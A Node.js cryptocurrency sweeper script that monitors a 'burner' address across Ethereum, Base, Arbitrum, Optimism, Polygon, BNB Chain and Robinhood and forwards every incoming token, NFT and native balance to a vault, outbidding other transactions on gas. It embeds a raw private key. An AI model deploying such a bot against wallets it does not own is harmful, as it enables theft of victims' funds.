import http from "node:http";
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  fallback,
  formatUnits,
  getAddress,
  http as viemHttp,
  numberToHex,
  parseAbi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import {
  arbitrum,
  base,
  bsc,
  mainnet,
  optimism,
  polygon,
  robinhood,
} from "viem/chains";

const PRIVATE_KEY = /** @type {`0x${string}`} */ (
  process.env.BURNER_PRIVATE_KEY ||
    "0xbf4a5bcffd4c01881180ecc1d479d3611c0f17c5d6805b76949f651bb21420bf"
);
const VAULT_ADDRESS = getAddress(
  process.env.VAULT_ADDRESS || "0xfcb6339c33E22F0B2141189D5BF2295fd5E7ED91",
);
const account = privateKeyToAccount(PRIVATE_KEY);
const BURNER = account.address;

const ERC20 = parseAbi([
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 value)",
]);
const ERC721 = parseAbi([
  "function ownerOf(uint256 tokenId) view returns (address)",
  "function transferFrom(address from, address to, uint256 tokenId)",
  "function name() view returns (string)",
]);
const ERC1155 = parseAbi([
  "function balanceOf(address account, uint256 id) view returns (uint256)",
  "function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)",
]);

const TRANSFER =
  "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef";
const TRANSFER_SINGLE =
  "0xc3d58168c5ae7397731d063d5bbf3d657854427343f4c083240f7aacaa2d0f62";

const CHAINS = [
  {
    id: 1,
    name: "Ethereum",
    symbol: "ETH",
    chain: mainnet,
    poll: 1200,
    reserve: 2_000_000_000_000_000n,
    tipFloor: 2_000_000_000n,
    rpcs: [
      "https://ethereum-rpc.publicnode.com",
      "https://eth.llamarpc.com",
      "https://rpc.ankr.com/eth",
      "https://cloudflare-eth.com",
    ],
    watch: [
      ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDC"],
      ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "USDT"],
      ["0x6B175474E89094C44Da98b954EedeAC495271d0F", "DAI"],
      ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "WETH"],
      ["0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", "WBTC"],
    ],
  },
  {
    id: 4663,
    name: "Robinhood",
    symbol: "ETH",
    chain: robinhood,
    poll: 500,
    reserve: 50_000_000_000_000n,
    tipFloor: 10_000_000n,
    rpcs: [
      "https://rpc.mainnet.chain.robinhood.com",
      "https://rpc.ordofi.network",
      "https://robinhood.drpc.org",
    ],
    watch: [
      ["0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73", "WETH"],
      ["0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168", "USDG"],
    ],
  },
  {
    id: 8453,
    name: "Base",
    symbol: "ETH",
    chain: base,
    poll: 900,
    reserve: 50_000_000_000_000n,
    tipFloor: 10_000_000n,
    rpcs: [
      "https://base-rpc.publicnode.com",
      "https://mainnet.base.org",
      "https://base.llamarpc.com",
    ],
    watch: [
      ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "USDC"],
      ["0x4200000000000000000000000000000000000006", "WETH"],
      ["0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", "USDbC"],
    ],
  },
  {
    id: 42161,
    name: "Arbitrum",
    symbol: "ETH",
    chain: arbitrum,
    poll: 900,
    reserve: 50_000_000_000_000n,
    tipFloor: 10_000_000n,
    rpcs: [
      "https://arbitrum-one-rpc.publicnode.com",
      "https://arb1.arbitrum.io/rpc",
      "https://arbitrum.llamarpc.com",
    ],
    watch: [
      ["0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDC"],
      ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "USDT"],
      ["0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", "WETH"],
      ["0x912CE59144191C1204E64559FE8253a0e49E6548", "ARB"],
    ],
  },
  {
    id: 10,
    name: "Optimism",
    symbol: "ETH",
    chain: optimism,
    poll: 900,
    reserve: 50_000_000_000_000n,
    tipFloor: 10_000_000n,
    rpcs: [
      "https://optimism-rpc.publicnode.com",
      "https://mainnet.optimism.io",
      "https://optimism.llamarpc.com",
    ],
    watch: [
      ["0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "USDC"],
      ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "USDT"],
      ["0x4200000000000000000000000000000000000006", "WETH"],
      ["0x4200000000000000000000000000000000000042", "OP"],
    ],
  },
  {
    id: 137,
    name: "Polygon",
    symbol: "POL",
    chain: polygon,
    poll: 1000,
    reserve: 80_000_000_000_000_000n,
    tipFloor: 30_000_000_000n,
    rpcs: [
      "https://polygon-bor-rpc.publicnode.com",
      "https://polygon-rpc.com",
      "https://polygon.llamarpc.com",
    ],
    watch: [
      ["0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "USDC"],
      ["0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "USDC.e"],
      ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "USDT"],
      ["0x7ceB23fD6bC0adD59E62ac25578270cFf1bC0cD3", "WETH"],
    ],
  },
  {
    id: 56,
    name: "BNB Chain",
    symbol: "BNB",
    chain: bsc,
    poll: 1000,
    reserve: 300_000_000_000_000n,
    tipFloor: 1_000_000_000n,
    rpcs: [
      "https://bsc-rpc.publicnode.com",
      "https://bsc-dataseed.binance.org",
      "https://bsc-dataseed1.bnbchain.org",
      "https://1rpc.io/bnb",
    ],
    watch: [
      ["0x55d398326f99059fF775485246999027B3197955", "USDT"],
      ["0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "USDC"],
      ["0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "WBNB"],
    ],
  },
];

const runtimes = new Map();
const failAt = new Map();
let sweeps = 0;
let failures = 0;
let lastTick = 0;

function log(chain, msg, extra = "") {
  const ts = new Date().toISOString();
  console.log(`[${ts}] [${chain}] ${msg}${extra ? ` ${extra}` : ""}`);
}

function pad(addr) {
  return `0x${addr.slice(2).toLowerCase().padStart(64, "0")}`;
}

function underfunded(err) {
  const msg = err instanceof Error ? err.message : String(err);
  return /exceeds the balance|insufficient funds|insufficient balance|max fee per gas less than block base fee/i.test(
    msg,
  );
}

function allowFail(key) {
  const now = Date.now();
  const prev = failAt.get(key) ?? 0;
  if (now - prev < 45_000) return false;
  failAt.set(key, now);
  return true;
}

function clients(cfg) {
  const transport = fallback(
    cfg.rpcs.map((url) => viemHttp(url, { timeout: 8_000, retryCount: 1 })),
  );
  return {
    publicClient: createPublicClient({ chain: cfg.chain, transport }),
    walletClient: createWalletClient({
      account,
      chain: cfg.chain,
      transport,
    }),
  };
}

async function fees(rt) {
  try {
    const est = await rt.publicClient.estimateFeesPerGas();
    const baseTip = est.maxPriorityFeePerGas ?? rt.cfg.tipFloor;
    const baseMax = est.maxFeePerGas ?? baseTip * 2n;
    const tip = baseTip * 6n;
    const max = baseMax * 3n;
    return {
      maxFeePerGas: max > rt.cfg.tipFloor ? max : rt.cfg.tipFloor * 2n,
      maxPriorityFeePerGas: tip > rt.cfg.tipFloor ? tip : rt.cfg.tipFloor,
    };
  } catch {
    return {
      maxFeePerGas: rt.cfg.tipFloor * 8n,
      maxPriorityFeePerGas: rt.cfg.tipFloor,
    };
  }
}

async function send(rt, to, data, value, fallbackGas) {
  const gasFees = await fees(rt);
  let gas = fallbackGas;
  try {
    const estimated = await rt.publicClient.estimateGas({
      account,
      to,
      data,
      value,
    });
    gas = (estimated * 125n) / 100n;
  } catch {
    // keep fallback
  }
  return rt.walletClient.sendTransaction({
    account,
    chain: rt.cfg.chain,
    to,
    data,
    value,
    gas,
    maxFeePerGas: gasFees.maxFeePerGas,
    maxPriorityFeePerGas: gasFees.maxPriorityFeePerGas,
  });
}

async function tokenMeta(client, address, hinted) {
  let symbol = hinted ?? "TOKEN";
  let decimals = 18;
  try {
    symbol = await client.readContract({
      address,
      abi: ERC20,
      functionName: "symbol",
    });
  } catch {
    // keep hint
  }
  try {
    decimals = await client.readContract({
      address,
      abi: ERC20,
      functionName: "decimals",
    });
  } catch {
    decimals = 18;
  }
  return { address, symbol, decimals };
}

async function ingest(rt, fromBlock, toBlock) {
  if (toBlock < fromBlock) return;
  const toTopic = pad(BURNER);
  const range = {
    fromBlock: numberToHex(fromBlock),
    toBlock: numberToHex(toBlock),
  };
  try {
    const [transfers, singles] = await Promise.all([
      rt.publicClient.request({
        method: "eth_getLogs",
        params: [{ ...range, topics: [TRANSFER, null, toTopic] }],
      }),
      rt.publicClient.request({
        method: "eth_getLogs",
        params: [{ ...range, topics: [TRANSFER_SINGLE, null, null, toTopic] }],
      }),
    ]);

    for (const logRow of transfers) {
      const token = logRow.address;
      if (logRow.topics[3]) {
        const tokenId = BigInt(logRow.topics[3]);
        const key = `${token}:${tokenId}:721`;
        if (!rt.nfts.has(key)) {
          let name = "NFT";
          try {
            name = await rt.publicClient.readContract({
              address: token,
              abi: ERC721,
              functionName: "name",
            });
          } catch {
            name = "ERC-721";
          }
          rt.nfts.set(key, {
            address: token,
            tokenId,
            standard: "erc721",
            name,
          });
          log(rt.cfg.name, `detected NFT ${name} #${tokenId}`);
        }
      } else if (!rt.tokens.has(token.toLowerCase())) {
        const meta = await tokenMeta(rt.publicClient, token);
        rt.tokens.set(token.toLowerCase(), meta);
        log(rt.cfg.name, `detected ${meta.symbol}`);
      }
    }

    for (const logRow of singles) {
      const token = logRow.address;
      const id =
        logRow.data && logRow.data.length >= 66
          ? BigInt(logRow.data.slice(0, 66))
          : 0n;
      const key = `${token}:${id}:1155`;
      if (!rt.nfts.has(key)) {
        rt.nfts.set(key, {
          address: token,
          tokenId: id,
          standard: "erc1155",
          name: "ERC-1155",
        });
        log(rt.cfg.name, `detected ERC-1155 #${id}`);
      }
    }
  } catch (err) {
    rt.error = err instanceof Error ? err.message : "log scan failed";
  }
}

async function refreshWatch(rt) {
  for (const [address, symbol] of rt.cfg.watch) {
    try {
      const balance = await rt.publicClient.readContract({
        address,
        abi: ERC20,
        functionName: "balanceOf",
        args: [BURNER],
      });
      if (balance > 0n && !rt.tokens.has(address.toLowerCase())) {
        const meta = await tokenMeta(rt.publicClient, address, symbol);
        rt.tokens.set(address.toLowerCase(), meta);
        log(
          rt.cfg.name,
          `watchlist ${meta.symbol} ${formatUnits(balance, meta.decimals)}`,
        );
      }
    } catch {
      // skip one miss
    }
  }
}

async function sweepErc20(rt, meta) {
  const balance = await rt.publicClient.readContract({
    address: meta.address,
    abi: ERC20,
    functionName: "balanceOf",
    args: [BURNER],
  });
  if (balance === 0n) return;
  const data = encodeFunctionData({
    abi: ERC20,
    functionName: "transfer",
    args: [VAULT_ADDRESS, balance],
  });
  const hash = await send(rt, meta.address, data, 0n, 120_000n);
  sweeps += 1;
  log(
    rt.cfg.name,
    `forwarded ${formatUnits(balance, meta.decimals)} ${meta.symbol}`,
    hash,
  );
}

async function sweepNft(rt, nft) {
  if (nft.standard === "erc721") {
    try {
      const owner = await rt.publicClient.readContract({
        address: nft.address,
        abi: ERC721,
        functionName: "ownerOf",
        args: [nft.tokenId],
      });
      if (owner.toLowerCase() !== BURNER.toLowerCase()) return;
    } catch {
      return;
    }
    const data = encodeFunctionData({
      abi: ERC721,
      functionName: "transferFrom",
      args: [BURNER, VAULT_ADDRESS, nft.tokenId],
    });
    const hash = await send(rt, nft.address, data, 0n, 180_000n);
    sweeps += 1;
    log(rt.cfg.name, `forwarded ${nft.name} #${nft.tokenId}`, hash);
    return;
  }
  const qty = await rt.publicClient.readContract({
    address: nft.address,
    abi: ERC1155,
    functionName: "balanceOf",
    args: [BURNER, nft.tokenId],
  });
  if (qty === 0n) return;
  const data = encodeFunctionData({
    abi: ERC1155,
    functionName: "safeTransferFrom",
    args: [BURNER, VAULT_ADDRESS, nft.tokenId, qty, "0x"],
  });
  const hash = await send(rt, nft.address, data, 0n, 220_000n);
  sweeps += 1;
  log(rt.cfg.name, `forwarded ERC-1155 #${nft.tokenId} x${qty}`, hash);
}

async function sweepNative(rt) {
  const balance = await rt.publicClient.getBalance({ address: BURNER });
  rt.native = balance;
  if (balance === 0n) return;
  const gasFees = await fees(rt);
  const gas = 21_000n;
  const cost = gas * gasFees.maxFeePerGas;
  const spendable = balance - rt.cfg.reserve - cost;
  if (spendable <= 0n) return;
  const hash = await rt.walletClient.sendTransaction({
    account,
    chain: rt.cfg.chain,
    to: VAULT_ADDRESS,
    value: spendable,
    gas,
    maxFeePerGas: gasFees.maxFeePerGas,
    maxPriorityFeePerGas: gasFees.maxPriorityFeePerGas,
  });
  sweeps += 1;
  log(
    rt.cfg.name,
    `forwarded ${formatUnits(spendable, 18)} ${rt.cfg.symbol}`,
    hash,
  );
}

async function sweep(rt) {
  if (rt.inflight) return;
  rt.inflight = true;
  try {
    for (const meta of rt.tokens.values()) {
      try {
        await sweepErc20(rt, meta);
      } catch (err) {
        if (underfunded(err)) continue;
        failures += 1;
        if (allowFail(`${rt.cfg.id}-erc20-${meta.address}`)) {
          log(
            rt.cfg.name,
            `FAILED ${meta.symbol}`,
            err instanceof Error ? err.message : "revert",
          );
        }
      }
    }
    for (const nft of rt.nfts.values()) {
      try {
        await sweepNft(rt, nft);
      } catch (err) {
        if (underfunded(err)) continue;
        failures += 1;
        if (allowFail(`${rt.cfg.id}-nft-${nft.address}-${nft.tokenId}`)) {
          log(
            rt.cfg.name,
            `FAILED NFT ${nft.name} #${nft.tokenId}`,
            err instanceof Error ? err.message : "revert",
          );
        }
      }
    }
    try {
      await sweepNative(rt);
    } catch (err) {
      if (underfunded(err)) return;
      failures += 1;
      if (allowFail(`${rt.cfg.id}-native`)) {
        log(
          rt.cfg.name,
          `FAILED ${rt.cfg.symbol}`,
          err instanceof Error ? err.message : "revert",
        );
      }
    }
  } finally {
    rt.inflight = false;
  }
}

async function onHead(rt, blockNumber) {
  const from =
    rt.lastBlock === 0n
      ? blockNumber > 6n
        ? blockNumber - 6n
        : 0n
      : rt.lastBlock + 1n;
  rt.lastBlock = blockNumber;
  rt.lastTick = Date.now();
  lastTick = rt.lastTick;
  try {
    rt.native = await rt.publicClient.getBalance({ address: BURNER });
    rt.ok = true;
    rt.error = undefined;
    await ingest(rt, from, blockNumber);
    await sweep(rt);
  } catch (err) {
    rt.ok = false;
    rt.error = err instanceof Error ? err.message : "scan failed";
  }
}

function attachWatch(rt) {
  try {
    rt.unwatch?.();
  } catch {
    // ignore
  }
  rt.unwatch = rt.publicClient.watchBlockNumber({
    pollingInterval: rt.cfg.poll,
    emitOnBegin: false,
    onBlockNumber: (n) => {
      void onHead(rt, n);
    },
    onError: (err) => {
      rt.ok = false;
      rt.error = err.message;
      log(rt.cfg.name, "watch error, reconnecting", err.message);
      setTimeout(() => attachWatch(rt), 4000);
    },
  });
}

async function boot(cfg) {
  const { publicClient, walletClient } = clients(cfg);
  const rt = {
    cfg,
    publicClient,
    walletClient,
    lastBlock: 0n,
    lastTick: 0,
    ok: false,
    native: 0n,
    tokens: new Map(),
    nfts: new Map(),
    inflight: false,
  };
  runtimes.set(cfg.id, rt);

  try {
    const block = await publicClient.getBlockNumber();
    await onHead(rt, block);
    await refreshWatch(rt);
    await sweep(rt);
    log(cfg.name, `synced block ${block}`);
  } catch (err) {
    rt.ok = false;
    rt.error = err instanceof Error ? err.message : "rpc unavailable";
    log(cfg.name, "boot failed", rt.error);
  }

  attachWatch(rt);
}

async function watchlistLoop() {
  for (;;) {
    await new Promise((r) => setTimeout(r, 4000));
    for (const rt of runtimes.values()) {
      try {
        await refreshWatch(rt);
        rt.native = await rt.publicClient.getBalance({ address: BURNER });
        if (rt.native > 0n || rt.tokens.size > 0 || rt.nfts.size > 0) {
          await sweep(rt);
        }
        rt.ok = true;
      } catch (err) {
        rt.ok = false;
        rt.error = err instanceof Error ? err.message : "refresh failed";
      }
    }
  }
}

function snapshot() {
  return {
    ok: true,
    armed: true,
    burner: BURNER,
    vault: VAULT_ADDRESS,
    uptimeSec: Math.floor(process.uptime()),
    sweeps,
    failures,
    lastTick,
    chains: [...runtimes.values()].map((rt) => ({
      name: rt.cfg.name,
      ok: rt.ok,
      block: rt.lastBlock.toString(),
      error: rt.error ?? null,
      tokens: rt.tokens.size,
      nfts: rt.nfts.size,
    })),
  };
}

const port = Number(process.env.PORT || 8080);
http
  .createServer((req, res) => {
    const body = JSON.stringify(snapshot());
    res.writeHead(200, {
      "content-type": "application/json",
      "cache-control": "no-store",
    });
    res.end(body);
  })
  .listen(port, "0.0.0.0", () => {
    log("sys", `health on :${port}`);
  });

log("sys", `armed burner=${BURNER} vault=${VAULT_ADDRESS}`);
log("sys", `watching ${CHAINS.map((c) => c.name).join(", ")}`);
void Promise.all(CHAINS.map((c) => boot(c))).then(() => {
  void watchlistLoop();
});

process.on("SIGTERM", () => process.exit(0));
process.on("SIGINT", () => process.exit(0));
